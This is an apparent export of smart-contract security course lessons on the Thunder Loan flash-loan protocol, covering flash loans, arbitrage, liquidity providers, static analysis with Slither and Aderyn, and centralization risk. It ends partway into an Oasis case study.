          title: Phase 2 Recon - Reading the Docs
          ---



          ---

          # Thunder Loans: In-depth Dive into Flash Loan Protocols

          Welcome to this comprehensive deep dive into flash loan protocols. In particular, we will be focusing on the Thunder Loan protocol heavily based on Aave and Compound.

          If you're not familiar with Aave, I recommend checking out this explainer video available at [Whiteboard Crypto](https://www.whiteboardcrypto.com/). It's a fantastic resource to learn the ins and outs of borrowing and lending protocols at a high level.

          For this particular blog, we're going to thrust ourselves much deeper to dissect these protocols and thoroughly understand how they make Thunder Loans possible.

          Let's kick-off the discussion by outlining what is Thunder Loans.

          ## Thunder Loan Protocol: A Flash Loan Blueprint

          The Thunder Loan protocol is designed with two main objectives. Firstly, it aims to provide users with the ability to construct flash loans. Secondly, it offers liquidity providers a chance to profit off their capital.

          > "What's a flash loan?"

          If you posed this question, I urge you to hang on as we will delve into it later in this post. But first, let's get up to speed on some terminology.

          A _liquidity provider_, as some of you might be aware, is an individual who pours money into a protocol to yield interest. An inevitable question that follows is, "where does the interest come from?" It's a question vital to both an investor and a security researcher's perspective.

          Taking t-swap as an example, the interest generated is sourced from the fees levied on swaps. Translating the same logic, in Thunder Loans, the interest is likely derived from the fees attached to these flash loans.

          Remember, when you deposit money into Thunder Loans, you're given an asset token, which gradually accrues interest over time depending on the prevalence of flash loans.

          Alright, let's dissect what exactly is a flash loan.

          ## Flash Loans: A Simple Explanation

          The term 'Flash Loan' refers to a loan that spans precisely one transaction. In simpler terms, a user can borrow any sum of assets from a loan protocol as long as they completely pay it back within the same transaction. Failure to adhere to this rule causes the transaction to revert, cancelling the loan automatically.

          Additionally, a tiny fee is imposed to the protocol depending on the borrowed amount. In Thunder Loans, to determine these fees, we utilize the renowned on-chain T-swap price Oracle.

          ![](https://cdn.videotap.com/NZwarBK1M4rlkUCCFnyN-120.67.png)Thunder loans are currently planning to progress from the existing Thunder Loan contract to an upgraded one. This upgrade forms part of our security review's scope.

          To effectively navigate these waters, we must develop a solid understanding of flash loans and get better acquainted with this lending and borrowing protocol. Hopefully, some graphical diagrams could perhaps simplify our learning process.

          Therefore, to understand this innovative DeFi primitive, I implore you to delve more into flash loans. Its knowledge is crucial to dissect the intricacies of Thunder Loans.

          ## Wrapping Up

          In this modern era of DeFi, understanding flash loans is remarkably essential. This blog is intended to provide a leap pad that gets you from novice to advanced levels of understanding how Thunder Loans operates and what are Flash Loans.

          So, pull out your notes, and let‚Äôs dive more in-depth into the world of flash loans. Understanding and leveraging flash loans can potentially change your perspective on lending and borrowing protocols.

          That's all for today. Stay tuned for more insightful blogs on the expansive DeFi universe!
        description: 'Patrick showcases Aave & Compound integration, allowing users to create flash loans and liquidity providers to earn from deposits.'
      -
        id: b80e0aaa-037c-414a-b27c-85c8f0b845da
        type: new_lesson
        enabled: true
        title: 'What is a Flash Loan?'
        slug: what-is-flash-loan
        duration: 4
        video_url: 9B9TNLY54bU002eMXzRXadkcFIp5Y1CL80052CHQY02wi00
        raw_markdown_url: /routes/security/6-thunder-loan/4-what-is-flash-loan/+page.md
        markdown_content: |-
          ---
          title: What is a flash loan? - Arbitrage
          ---



          ---

          # Flash Loans: Leveling the Crypto Playing Field

          As advances in Decentralized Finance (DeFi) shift into high gear, decentralized exchanges (DEX) are positioned at the epicenter of these developments. Previously, trading on these platforms was a privilege reserved for the financial elite - popularly known as 'whales' - who could leverage their massive capital assets to make significant gains. However, the advent of **flash loans** has democratized this field.

          So, how does this groundbreaking innovation operate and help bridge the gap between the haves and the haven'ts in the crypto world?

          ## Understanding the Concept of Arbitrage

          Let's consider a typical scenario. Suppose there are two DEXs, A and B. On Dex A, the exchange rate for Ethereum stands at $5, and on Dex B, Ethereum is trading at $6. Savvy investors might be quick to see an opportunity for profit.

          You could buy one Ethereum at DEX A for $5, then head over to DEX B and sell that Ethereum for $6. This simple transaction would net you a profit of $1. This process is known as **Arbitrage.**

          > ‚ÄúArbitrage is exploiting the market's inefficiencies. By observing the different prices of an asset on various exchanges, you can leverage these differences to turn a profit.‚Äù

          ![](https://cdn.videotap.com/14PlrcuOsiwwbz21cqO4-71.61.png)

          ## Arbitrage in Action: Difference in Capital

          The catch here is, to initiate this process, you would need to have the $5 necessary to kick-start this operation. But there‚Äôs an inherent limitation when you consider a small-scale trader, let‚Äôs say with only $5 in their pocket. Despite spotting this golden opportunity, they are limited to a single transaction due to their capital constraint. Their profits are also limited because they can only perform these operations one at a time.

          Let's consider a drastically different scenario: a user starts with a capital injection of $5,000 instead of $5. They can now purchase 1000 Ethereum tokens on DEX A and then sell them on DEX B, consequently earning $6,000. Here, the trader notches a profit of $1,000.

          > Simply put, the more money you start with, the higher your potential profits.

          In the traditional web 2.0 world, this strategy was dominated by 'whales,' (a colloquial term denoting individuals with substantial capital or numerous tokens) as they could afford to take advantage of such lucrative opportunities.

          ![](https://cdn.videotap.com/rrfz0m4i5sGKt8xvQTqp-135.26.png)

          ## Introducing Flash Loans

          What if there was a mechanism that allowed any trader, regardless of their initial capital, to access substantial loans and instantly pay them back? Enter flash loans, an innovative concept that evens the playing field. In essence, a flash loan allows any user to become a "whale" for a single transaction.

          Through flash loans, our earlier protagonist with only $5 can perform the same operations as the deep-pocketed trader with $5,000. This revolutionary concept raises a critical question: How can flash loans level the playing field and make web 3.0 finance more equitable?

          To unravel this complex conundrum, we need a deep understanding of what a flash loan is and how it functions. Stay tuned as we dig deeper into this game-changing financial instrument in our ensuing posts.

          In the next article, we dive into the workings of flash loans, their essence, and how they are leveling the playing field for every player in the crypto universe. Stay tuned!
        description: 'Patrick explains DEX arbitrage using an example and introduces flash loans for Web3 finance.'
      -
        id: 5308c413-16b5-42c8-8b55-91ccbe055788
        type: new_lesson
        enabled: true
        title: 'Pay Back Or Revert'
        slug: pay-back-or-revert
        duration: 4
        video_url: pLXbCpqEbRA01NQhoU5y5W008C6nkngGL2b8EGU35EgZw
        raw_markdown_url: /routes/security/6-thunder-loan/5-pay-back-or-revert/+page.md
        markdown_content: |-
          ---
          title: What is a flash Loan - Pay back the loan or revert
          ---



          ---

          # The Power and Potential of Flash Loans in DeFi

          Flash loans provide an innovative financial solution in the decentralized finance (DeFi) world, particularly for arbitrage and various other investment strategies. By examining how they work in the context of smart contracts, we can see how they open up fresh opportunities for DeFi users.

          ## A Closer Look at DeFi Protocols and Smart Contracts

          In DeFi, many protocols have funds inside a contract. For instance, 1,000 USDC might be stored in a contract, controlled by immutable code. It is this immutable nature that ensures that any funds disbursed by the contract are secured against possible theft.

          The power of DeFi and smart contracts makes them amazing. Particularly because we can encode instructions into them. For instance, a smart contract can be encoded to lend 1,000 USDC to a borrower within a transaction, with the strict condition that the money is returned by the end of the transaction. If the borrower fails to repay the funds, then‚Äîin the miraculous world of web three‚Äîwe can revert the entire transaction! This means that instead of the money disappearing, the transaction is restored to its initial state as though it never occurred. And all this can be encoded into the initial smart contract.

          ## The Intricacies of Flash Loans in DeFi

          Now that we understand the code that governs them, let's look at what this process actually looks like in action.

          ![](https://cdn.videotap.com/o9RbphgNLng9CnbEUGQa-140.92.png)

          Imagine that a flash loan contract has been set up. The encoded contract permits a borrower to take a loan of 1,000 USDC, provided it is repaid by the end of the transaction. This all happens within a single transaction.

          This borrowed money is then sent to a contract controlled by the borrower, where the borrower can perform various tasks with the borrowed funds. These might range from arbitrage strategies to simply maintaining the funds in possession for transaction. The contract then has an obligation to repay the loan to the initial lender contract.

          At the end of the transaction, the lender contract conducts a check to ascertain whether the loan has been repaid. If the balance is less than the expected repayment, the entire transaction is reverted, and the blockchain state is restored to the point before the transaction took place.

          And this, in essence, is how a flash loan works. This facility couldn't exist outside of the web three world. It‚Äôs potential uses are almost limitless, making it an exciting financial tool in the realm of DeFi.

          ## In the Real World of DeFi

          Take a moment to consider the implications of this. With strict conditions ensuring the return of funds, flash loans throw open novel opportunities in the decentralized finance space. Time and imagination are the only constraints on how these funds might be utilized within that single transaction.

          > The beauty of flash loans lies in their simplicity and security. A borrower can leverage these loans for sophisticated strategies in a secure, risk-free environment, thanks to built-in transaction reversion. Truly, flash loans embody the full potential of DeFi.

          Flash loans open up a playground for experimentation and investment strategy, and they are yet another reason DeFi is an exciting field to watch!
        description: 'Dives deeper into how flashloans work and the requirement of repayment in a single transaction.'
      -
        id: e55d95b1-496b-43ce-9015-bb59b98e1b04
        type: new_lesson
        enabled: true
        title: 'Liquidity Providers'
        slug: liquidity-providers
        duration: 2
        video_url: ew8JjN2FI00eh02sqeX5FIlpwQJrJV4rr901W01f2hgF3bg
        raw_markdown_url: /routes/security/6-thunder-loan/6-liquidity-providers/+page.md
        markdown_content: |-
          ---
          title: What is a flash loan - Liquidity Providers
          ---



          ---

          # Deep Dive Into Flash Loans and Liquidity Providers

          Welcome to another blog post in our crypto education series, where we explore the intriguing world of decentralized finance (DeFi) concepts. Today, we'll be focusing on the concept of Flash Loans, a highly popular instrument in the DeFi space. More specifically, we'll look at the role of those special behind-the-scene players called Liquidity Providers - their relationship with Flash Loans and how they gain from the system.

          ## The Concept of Flash Loans

          For the uninitiated, Flash Loans are a DeFi innovation which enables borrowing of an asset without collateral, provided that the loan is repaid within the same transaction block. Now you may ask, how does money magically appear for these loans? And who provides this capital? Let's answer these.

          ## Understanding Liquidity Providers

          Just like in traditional finance, the capital for loans don't just materialize out of thin air. The $1,000 or any amount of the Flash Loan is actually provided by what we call a "liquidity provider". In most cases, these are users (or "whales") who deposit a significant amount of money into a liquidity pool in a smart contract.

          For instance, assume a user deposited $1,000 into a smart contract. This wouldn't be as simple as a one-sided transaction. Instead, they receive shares of the pool - a sort of 'receipt' denoting their contribution of $1,000 worth of tokens.

          ## The Flash Loan Process

          The Flash Loan's working can be understood through a simple flow: the user requests the Flash Loan, borrows the money, and immediately pays it back. The USDC quickly cycles between the borrower and the liquidity pool.

          It's important to note that Flash Loans are not free to utilize. Borrowers have to pay a small fee every time they borrow, often something as minuscule as a +0.1% on the borrowed amount.

          ## Earning Through Fees

          Here‚Äôs where things get interesting for our liquidity providers. Every Flash Loan borrowed, and the associated fee, is accrued in the contract. So instead of just the original $1,000, the total pool keeps keeping amplified by the accrued fees e.g., $1,002, $1,003, and so on as more Flash Loans are taken.

          In layman's terms, liquidity providers gather fees from every Flash Loan issued, making their investment worth it. Indeed, as succinctly summed up in this quote:

          > "Because they deposited money to the protocol, they're going to get fees for people taking out these Flash loans."

          ![](https://cdn.videotap.com/YjlbuTfa3JOWtnR1HeLa-81.png)

          In conclusion, Flash Loans present a fascinating facet of the DeFi world, with many moving parts at play. Here's cheers to getting to understand the skeleton of yet another DeFi innovation! Stay tuned for more DeFi explorations in our upcoming blogs.
        description: "Overview - Flash Loans & Liquidity Providers.' Emphasis on liquidity providers, flash loans, transaction fees, and benefits for depositors."
      -
        id: 8232d5e0-21bb-491d-9e57-7dce5033eac4
        type: new_lesson
        enabled: true
        title: 'Arbitrage Walkthrough'
        slug: arbitrage-walkthrough
        duration: 5
        video_url: z5N007sMkjW2KPaWATi7YVTQsuPk8sk1IVi79rdCuJGA
        raw_markdown_url: /routes/security/6-thunder-loan/7-arbitrage-walkthrough/+page.md
        markdown_content: |-
          ---
          title: Arbitrage walkthrough
          ---



          ---

          # Spotting Opportunities with Flash Loans in DeFi: A Beginner's Guide

          In this blog post, we'll walk you through a simple yet effective use case of flash loans in the ever-growing DeFi sphere. These instantaneous and uncollateralized crypto borrowings have the potential to level the playing field for those just beginning their journey with decentralized finance.

          ![](https://cdn.videotap.com/pU3EHWsVTfLRc7Io0d4p-11.31.png)## The Scenario: Decentralized Exchanges and A Flash Loan Protocol

          Flash loans can be used to take advantage of discrepancies between different decentralized exchanges. In our use case, for illustrative purposes, let's imagine two decentralized exchanges, **DEX A** that values 1 ETH at $5 and **DEX B**, valuing 1 ETH at $6. Let's introduce our player, **Little Fox**, who initially has $5 and aspires to leverage these discrepancies for gains, much like big players or ‚Äúwhales‚Äú.

          Ordinarily, he could repeatedly buy ETH from DEX A and sell on DEX B to benefit from the price disparity while it lasts. However, performing this arbitrage manually would entail considerable gas fees and risk attracting copycats, eroding the arbitrage opportunity over time. This approach, therefore, isn't practical nor efficient.

          Enter **flash loans**, an innovative DeFi tool that can significantly change the landscape.

          ![](https://cdn.videotap.com/nb798NifZCWAlRyaN0W8-39.57.png)

          ## The Flash Loan Mechanism: How Does It Work?

          Below, we're going to break down how our Little Fox can employ the power of flash loans and achieve the same level of profit as a whale.

          In our example, there's a flash loan protocol that enables individuals to borrow substantial sums of capital. The protocol begins empty, awaiting deposits from prospective lenders.

          Let‚Äôs say a whale deposits $5,000 into the protocol, creating 5,000 flash loan tokens (FLTs). Owning 100% of the FLTs, the whale essentially owns all the money in the protocol. They can use their FLTs to retrieve their full deposit at any time they wish.

          ## Step 1: Requesting the flash loan

          The first step for Little Fox is to call the flash loan function on the smart contract to borrow the $5,000 from the protocol.

          ### Step 2: Executing the arbitrage strategy

          Remember that all actions using the borrowed funds must occur within one blockchain transaction to prevent loan default. Therefore, we represent the following steps with a single 'transaction call'

          ### Step 3: Repaying the flash loan

          Finally, Little Fox repays the $5,000 flash loan to the protocol and keeps the $1,000 profit.

          ![](https://cdn.videotap.com/ZCzIKYmtOmiYCUylbef8-237.43.png)

          In effect, by initially borrowing $5,000, buying 1,000 ETH, re-selling the ETH for $6,000 and returning the initial $5,000 (plus a tiny fee), Little Fox made the same $1,000 gain that the whale would‚Äôve without the initial capital.

          > "Despite starting with just $5 and incurring a tiny fee, our Little Fox was able to end up with a juicy profit of almost $1,000, thanks to flash loans."

          To provide some perspective, let's keep in mind that real-world arbitrage opportunities won't always be as substantial, and gas costs can influence the profitability. However, the example underlines the power of flash loans to amplify potential profits in DeFi by enabling smaller players to punch above their weight.

          Flash loans epitomize the democratization of finance that lies at the heart of the DeFi movement. They demonstrate just how the playing field can be leveled by the power of smart contracts, providing opportunity and access to all participants, not just the 'whales'.
        description: 'How flash loans enable smaller traders to capitalize on arbitrage opportunities. Covers the significance of single transaction paybacks.'
      -
        id: 044a08db-c6fa-4162-8996-88a28d93bf76
        type: new_lesson
        enabled: true
        title: 'Are Flash Loans Bad?'
        slug: are-flash-loans-bad
        duration: 1
        video_url: oTkNg6P5CSDG6JOX4zoCD2NH3QW8TwVSeZ4NXYq5urM
        raw_markdown_url: /routes/security/6-thunder-loan/8-are-flash-loans-bad/+page.md
        markdown_content: |-
          ---
          title: Are Flash Loans Bad?
          ---



          ---

          # Flash Loans in Crypto Finance: A Level Playing Field

          Crypto finance, or more aptly the world of DeFi (Decentralized Finance), is a rapidly evolving landscape. There's one key feature that has been stirring up quite a debate: **flash loans**. Today, we delve deeper into what flash loans are and how they're positively impacting the sphere.

          Before we tread further, for those unfamiliar with the term, let's start with a brief walkthrough of what flash loans are.

          ## What are Flash Loans?

          In the context of DeFi, a flash loan is essentially an uncollateralized loan option that allows individuals to borrow cryptocurrency and repay it back within the same blockchain transaction. In other words, you borrow and repay in a single operation. This may sound more like a charade, but trust me, it's a feature that could be a game-changer.

          > "Flash loans allow anybody to be a whale in the traditional finance world."

          ![](https://cdn.videotap.com/Nz3tLzfPAOWomq9L4VVr-9.78.png)

          Flash loans are helpful in a myriad of applications, arbitrage being a major one, and we'll delve into exactly how these loans play out in the following sections.

          ## The Power of Flash Loans

          ### Equalizing the Playing Field

          In the traditional finance world and even in most commerce spaces, arbitrage opportunities exist. For those unfamiliar with this term, arbitrage is simply the practice of taking advantage of a price difference between two or more markets. It involves striking a combination of matching deals that capitalize upon the imbalance, with the profit being the difference between the market prices.

          However, there's a catch: these opportunities are usually accessible only to the super-rich or "whales", as they're colloquially referred to in the crypto world. Why? Because they are the ones with substantial capital to participate in these kinds of opportunities.

          In comes our knight in shining armour - the flash loans. By offering a way to take part in these opportunities without a massive initial capital, flash loans level the playing field and democratize the finance world, making it possible for anyone to be a ‚Äòwhale‚Äô ‚Äî if only for a single transaction.

          > "In the DeFi world, thanks to flash loans, the playing field is leveled and anyone can be a ‚Äòwhale‚Äô for a single transaction."

          ![](https://cdn.videotap.com/khoXIky8WmJ5fr0DE16U-22.png)

          ## The Positives of Flash Loans

          Contrary to popular belief, flash loans are not a negative elixir. They are empowering smaller investors and participants by opening gateways to opportunities that were previously locked up for the privileged few.

          Firstly, these loans are uncollateralized, meaning that you don't have to put up any collateral to secure a loan. You just enter, borrow the money, do your business and pay the loan back ‚Äî all within a single transaction block. This makes it really appealing for everyday folks to participate in the crypto market and benefit from the same.

          Secondly, flash loans have made it possible to conduct complex financial manoeuvres like arbitrage with practically zero upfront capital ‚Äî a situation that was unthinkable not too long ago. This gives an opportunity to the ordinary individuals to make a profit from the fluctuations in the notoriously volatile crypto markets, thus breaking the monopoly the ‚Äòwhales‚Äô had over such activities.

          ![](https://cdn.videotap.com/WdxwLG3XbBSQfHjisOdu-28.11.png)

          ## Conclusion

          In conclusion, flash loans in the world of DeFi, despite some of the criticisms they face, are indeed a positive evolution, as they democratize the crypto financial world and make it accessible to an average investor. The power to be a crypto 'whale' for even a single transaction has brought a much-needed sense of equity to this space. Therefore, flash loans are here to stay and likely to shape an increasingly level playing field in the crypto industry moving forward.

          So now, continue your exploration into the financial future. Know that you too can be a whale!
        description: "Flash loans: Leverage arbitrage in DeFi, enabling all users to act like 'whales' without needing significant wealth."
      -
        id: cd8d2270-4a46-4bdb-a9ec-7df8212ed851
        type: new_lesson
        enabled: true
        title: Recap
        slug: recap
        duration: 3
        video_url: xjBhcXE00cV1Ck7wCQzvWai1GE9i00vr9OQp6UN902DJzA
        raw_markdown_url: /routes/security/6-thunder-loan/9-recap/+page.md
        markdown_content: |-
          ---
          title: Recap
          ---



          ---

          # Decoding Flash Loans: A Comprehensive Walkthrough

          Welcome back! Today we're going to steer the wheel down the crypto lane and dive into a fascinating concept - Flash Loans.

          ![](https://cdn.videotap.com/e2sbhlbfl9ZreXlI3mzt-12.08.png)

          ## How Do Flash Loans Work?

          A quick rundown of how this all functions is necessary. Picture this: a whale (a large player in the crypto market) deposits $5,000 into the flash loan protocol.

          ![](https://cdn.videotap.com/ww7stcBKpXeTs9ZF51U1-30.19.png)

          ### The User Comes In

          After this, a user comes in and pulls out a $5,000 loan from the flash loan. This person now needs to repay the $5,000 plus any fees associated; if not, the transaction will revert. The user uses this borrowed amount to purchase $1,000 worth of Ethereum (ETH).

          ### Trading the ETH

          Then comes the interesting part. They sell the $1,000 worth of ETH for $6,000, and then return the originally borrowed amount‚Äîkeeping $1,000 for themselves, which results in net earnings of $995 after paying a $5 fee.

          ### Where Does The Money Go?

          So, in the course of these transactions, the flash loan protocol ends up with the initial $5,000 plus the $5 fee.

          ### Withdrawal by the Whale

          Lastly, whenever the whale chooses, they can withdraw their initial deposit by trading back in the flash loan token, which signifies their 100% ownership of the pool. So, for their $5,000 deposit, they receive $5,005: a mix of the original deposit amount and the accumulated fees.

          ## Learning About Arbitrage

          Alright, so that was quite a bit to absorb, but it paints a rough picture of how flash loans function. Now, why would someone want to use flash loans? A primary reason is arbitrage.

          Arbitrage is a scenario where you exploit a price discrepancy on two different exchanges. For instance, if Exchange A lists ETH at $5 and Exchange B lists ETH at $6, you can buy from A and sell at B to make a profit. This is arbitrage simplified.

          ## Flash Loans: Breaking Down Their Purpose

          Now, let's circle back to flash loans. What makes them unique is the rapidity with which they can be executed. A loan taken out for a single transaction, and if repaid immediately, it completes. If not, the transaction can be coded to automatically revert. This function is only possible in Web 3 platforms.

          Pulling these threads together, someone might utilize a flash loan to carry out arbitrage and benefit from a market price discrepancy.

          > "Flash loans allow us to take out quick loans for a single transaction. If we don't pay the money back, the transaction can automatically revert."

          ## Dig into It Yourself!

          For those seeking a more hands-on approach, we'll be adding examples of flash loan protocol arbitrage in the audit data branch of our GitHub repositories. All diagrams used in this post, as well as additional resources, can be found there.

          In conclusion, flash loans and arbitrage could be a lucrative way to leverage crypto market discrepancies, especially considering the volatility characteristic of this space. Whether you're an aspiring whale or a novice user aiming to dip your feet, understanding this realm can illuminate a whole new way of interacting with cryptocurrency.

          The main caveat, as always, is comprehension. Understanding the terms and conditions, and the associated risks, is a prerequisite to success in any financial venture, and flash loans are no exception. Be sure to dig into our other resources if you'd like more of a deep dive!
        description: "We're provided a summary of flash loans, arbitrage and how it all works in this recap of what we've just learnt."
      -
        id: d61670f8-0992-4154-b45a-41b2a482a0ea
        type: new_lesson
        enabled: true
        title: 'Recon Continued'
        slug: recon-continued
        duration: 4
        video_url: pU3ti8RWxJn9twmnJ7bX6023k3CyVr44F3HW7pBvjx200
        raw_markdown_url: /routes/security/6-thunder-loan/10-recon-continued/+page.md
        markdown_content: |-
          ---
          title: Recon (continued)
          ---



          ---

          # Understanding the Thunder Loan Protocol: A Comprehensive Review

          Welcome to another intriguing blog post where we'll dive deep into the world of cryptocurrencies, specifically focusing on the Thunder Loan protocol. This post is rooted in our continued commitment to simplify complex subjects in decentralized finance for you.

          ## Contextualizing the Thunder Loan Protocol

          Thunder Loan protocol, like many other DeFi (Decentralized Finance) protocols, is based on borrowing, lending, and flash loans. To fully grasp how this protocol operates, one must first comprehend how flash loans and borrowing/lending processes work.

          > _"Sometimes when you're doing security reviews, you got to look up stuff that might not seem related."_

          I recommend learning more about these protocols by exploring [Aave](https://aave.com) and [Compound](https://compound.finance). You could also watch related deep-dive videos to get more context.

          ## Breaking Down Flash Loans and Liquidity

          So, what is a flash loan? In essence, flash loans involve users borrowing substantial sums, completing arbitrage trades, then returning the borrowed sum in the same transaction. They are rapid transactions that thoroughly leverage the capabilities of smart contracts.

          Users, also known as liquidity providers, deposit their funds into the protocol. In exchange, they receive asset tokens, representing their stake in the protocol. Users also need to pay a small fee to the protocol, which depends on the borrowed sum.

          One might be curious: how is this fee calculated?

          Enter the **on-chain Tswap price oracle**.

          ## The Critical Role of the Tswap Price Oracle

          Price oracles play a crucial role in crypto trading platforms. They act as a bridge, bringing external real-world data or computation on-chain.

          > _"An Oracle is going to be a device that takes external real-world data or computation and brings it on-chain."_

          For instance, a price oracle could determine the price of Ethereum ‚Äì a concept forgotten by the material world. It's fascinating to note that the Thunder Loan protocol uses TSwap's Dex that we reviewed in our previous section as a price oracle.

          Now, one might wonder: why would the protocol need a price oracle?

          Let's dig in further.

          ## The Thunder Loan Protocol Upgrade

          We have one more puzzling detail. Thunder Loan Protocol is planning to upgrade their current contract to the Thunder Loan upgraded contract.

          This upgrade is a crucial element to be considered under the scope of our security review. The Thunder Loan seems to be an upgradable smart contract, following the Ownable Upgradable, UUPS Upgradable and Oracle Upgradable paths.

          ## Wrapping Up

          Finally, we've learned how the protocol sheds light on flash loans, arbitrage, and provides various opportunities for liquidity providers apart from their usual asset token interest.

          We've also noticed some unique features like the TSwap Price Oracle embedded into the protocol's ecosystem, contributing prominently to its functionality.

          This post should have given you a thorough overview of the Thunder Loan protocol. Now would be an ideal time for you to reach out to the protocol or prepare their diagrams, detailing how their whole system actually works.

          Remember to have fun, stay curious, and keep exploring!
        description: 'A quick guide to understanding the basis of borrowing/lending through flash loans. Emphasis on smart contract upgradeability and interactions in DeFi systems.'
      -
        id: cf98c920-cca9-4975-9259-b11408ae8b36
        type: new_lesson
        enabled: true
        title: 'Static Analysis - Slither & Aderyn'
        slug: static-analysis-slither-aderyn
        duration: 7
        video_url: jUA01mnh602HYtZLRdlmJwu1bc9xT01vACwwwZcXNmg73w
        raw_markdown_url: /routes/security/6-thunder-loan/11-static-analysis-slither-aderyn/+page.md
        markdown_content: |-
          ---
          title: Static Analysis Slither + Aderyn
          ---



          ---

          # Solidity Foundry Project: Running Slither and Aderyn

          Welcome back! In today's blog, we're going to throw ourselves into the heart of a Solidity foundry project. Unfortunately, there are no diagrams to help us along the way, but no worries, because we've got two brilliant tools at our disposal: **Slither** and **Aderyn**.

          ## Setting the Stage: Your Make File

          For this project, and any Solidity project moving forward, a typical **make file** will embrace a little Slither command line action and be embellished with a Slither Config JSON file.

          The Slither Config JSON that I am fond of using, you can tailor as per your project needs. What makes it special is the string of flags that are manually turned on or off to procure meaningful Slither outputs. _Fun Fact: You might notice I don‚Äôt include a few detectors like conformance to Solidity naming conventions or incorrect versions of Solidity. That‚Äôs because I have a fair share of taste for unconventional naming and most folks aren‚Äôt using 0.8.18 versions but rather zero point 20._

          Next, in our mission to make the Slither output as concise and helpful as possible, we make sure to filter paths to avoid pulling in redundant information from mocks, tests, scripts, upgraded protocol, or dependencies. This ensures we don't muddle our results with data from libraries.

          ## The Bug Hunt Begins

          On initiating Slither, we did hit something noteworthy, a bug! The first info detected was thunderloan update. The problem lay in that the action of the code `s_flashloan fee = new fee` was not triggering an event emission. This was in Thunder Loan line 269.

          Now, let's get to the heart of the update flash loan fee function. We spotted a `s_flashloan fee` variable. When we investigated further, it was found to be a storage variable.

          > Important: Whenever a storage update occurs, it is mandatory to emit an event.

          To make a note of it for the auditor, we wrote `@audit: low must emit an event.`But that's not the end of it. We found more issues with Slither.

          ## Fishy Thunderloan

          Slither also pointed out the possibility of reentrancy vulnerabilities in the Thunderloan flash loan because of external calls being made. We're not entirely sure of the severity, but we mark these for a follow-up review.

          > Note: Be sure to check out the mentioned lines (#204, #181) in Thunderloan for potential reentrancy vulnerabilities.

          ## Beware the Old Yellow

          Finally, Slither pointed out a yellow alert, which was a little concerning. The problem was that the return value of an external call was not stored in a local or state variable. Again, we must make a follow-up note of this and verify later if it's a grave issue.

          With the last yellow alert, we've run through all theing that Slither had to offer. However, we're still not done. Next, we need to run Aderyn.

          ## Round Two: Aderyn

          After running Aderyn, a report is generated. The report can be checked for any potential issues and, if need be, compared with Slither's findings.

          And voila, that's how you navigate through a Solidity project with the help of Slither and Aderyn. By doing so, you can identify potential vulnerabilities and build better, safer code. Until next time, happy coding!
        description: 'Learn how to use Slither & Aderyn by applying these powerful static analysis tools to Thunder Loan!'
      -
        id: bd391a8a-f18f-496a-94de-1b82c42ed12b
        type: new_lesson
        enabled: true
        title: 'Exploit: Centralization'
        slug: exploit-centralization
        duration: 3
        video_url: agXO01DKEutJjgPTKyucKjWI01KGYiXven4cJg8gPNKwo
        raw_markdown_url: /routes/security/6-thunder-loan/12-exploit-centralization/+page.md
        markdown_content: |-
          ---
          title: Exploit Centralization
          ---



          ---

          ---

          # **Understanding Centralization Risk in Contracts**

          If you've written code for a smart contract, you may have come across this pesky medium-issue termed the 'centralization risk.' Often underplayed or regarded as a known non-issue, centralization risk holds the highly explosive capability to compromise your entire protocol.

          ![](https://cdn.videotap.com/RLVhl7xtB45C5923CMwb-29.14.png)

          In this article, we will dissect this concept, characterized by contracts with privileged owners who exercise undue rights to perform administrative tasks. These individuals demand a blind trust not to execute malicious updates or drain funds - a colossal deal in the world of protocols.

          But, why should we report this in a private audit? Let's zoom in.

          ## **Why Centralization Risk Matters**

          The alarm bells around centralization risks are not just blown for fun. There are hundreds of thousands of reasons to do so, primary being the inherent security issue. This vulnerability, if left unaddressed, can lead to the disastrous situation known as a 'rug pull.'

          A metaphorical term, rug pull equates to the unanticipated withdrawal of liquidity from a protocol by its creators, rendering the protocol useless. Here's a quote aptly encapsulating this scenario:

          > "Imagine someone pulling the rug off underneath your feet leaving you in a freefall. That's what is a rug pull."

          Take a case wherein a contract is deployed, and it's vaunted as a decentralized entity. But the reality behind it is that it‚Äôs actually behind a proxy. At any unpredictable time, the owners of this proxy could upgrade the contract, introducing functions like 'steal all the money' - definitely not cool.

          ## **A Deep Dive into SC Exploits Minimize Git Repo**

          In the SC exploits minimize git repo associated with this course, we have chosen the SRC protocol's 'Thunder Loan.' We discovered that the protocol is rife with ownable actions. After sorting through 'Only Owner,' we spotted the functions set to allowed token, update Flash loan fee, and authorize Upgrade - all were exclusive to the owner.

          Additionally, the owner of the protocol holds the power to modify all functionalities as per whims and fancies. This ownership is possible since the protocol is set behind a UUPS Proxy contract. It means that with one misstep, the entire protocol can be swept away.

          It's not all bleak, though. Automated discovery tools like Adarin automatically seek centralization issues and generate comprehensive reports, minimizing the manual effort required to spot these vulnerabilities.

          ## **Exploring Further: Case Study of Oasis**

          Before we wrap up, let's undertake a brief study of an excellent DeFi vulnerability challenge based on Oasis. The purpose of this exercise is to delve into the insecurities laid bare by unchecked centralization.

          Our study highlighted that the contract owner could arbitrarily alter the balances of its users, effectively empowering the owner to rob the hard-earned ETH of its users. Consequently, this amplifies the centralization issue exponentially. This scenario mirrors an array of rug pulls stemmed from unchecked centralization.

          ## **Conclusion**

          In the end, it all boils down to one fact - the presence of centralization poses a severe risk to the security of any protocol. Being proactive in acknowledging and mitigating this risk is non-negotiable if we aim to maintain the integrity of our protocols. Centralization can be a security issue, but with constant vigil, we can tackle it head-on.

          Stay safe and happy coding!
        description: 'Learn the impact of centralization and discuss the importance of reporting such risks in private audits. Highlights case studies like Oasis.'
      -
        id: dbe192e5-2438-42f5-a9f8-efac77de2cde
        type: new_lesson
        enabled: true
        title: 'Case Study: Oasis'
        slug: case-study-oasis
        duration: 3
        video_url: 01tl9ytnUSHzqH9WFKMKAhEnguCvd02E02EChawvxRlLsU
        raw_markdown_url: /routes/security/6-thunder-loan/13-case-study-oasis/+page.md
        markdown_content: |-
          ---
          title: Centralization Case Study Oasis
          ---

          _Follow along with this video:_



          ---

          # The Oasis Protocol Hack Recovery: A Tale of Centralization Risks and Court-Mandated Exploits

          You have heard before about cyber thefts. But have you heard of one where hackers end up having the tables turned on them? This exactly happened earlier this year in the world of digital asset lending and borrowing. It's a rollercoaster of a story that involves smart contracts, the UK courts, and a protocol called Oasis. The protocol, incidentally, had projected itself as decentralized and permissionless, but ended up playing an ironic role. Let's dig in.

          ## Oasis and Its Security Meltdown

          Oasis is a digital platform that allows users to lend and borrow assets on the maker protocol. The exciting - and somewhat controversial - thing about it was its selling point as a decentralized and permissionless platform. In other words, there was no need for central intermediaries, fuss over permissions, or concerns about third-party interventions.

